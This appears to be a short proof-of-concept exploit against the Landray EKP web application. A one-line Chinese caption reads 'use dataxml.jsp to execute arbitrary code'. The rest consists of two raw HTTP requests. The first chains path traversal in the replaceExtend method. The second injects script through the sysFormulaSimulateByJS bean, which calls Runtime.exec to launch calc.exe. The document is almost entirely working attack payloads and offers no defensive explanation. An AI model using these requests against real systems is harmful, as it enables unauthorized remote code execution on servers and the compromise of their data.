```
GET /ekp/sys/ui/sys_ui_component/sysUiComponent.do?method=replaceExtend&extendId=../../../../resource/help/km/review/&folderName=../../../ekp/sys/common HTTP/1.1
Host:
```

利用 dataxml.jsp 执行任意代码

```
POST /ekp/resource/help/km/review/dataxml.jsp HTTP/1.1
Host:
Content-Type: application/x-www-form-urlencoded

s_bean=sysFormulaSimulateByJS&script=var x =
Function/**/('return(java.lang.Runtime.getRuntime())')();x.exec("calc.exe");var a=mainOutput();function mainOutput() {};
```

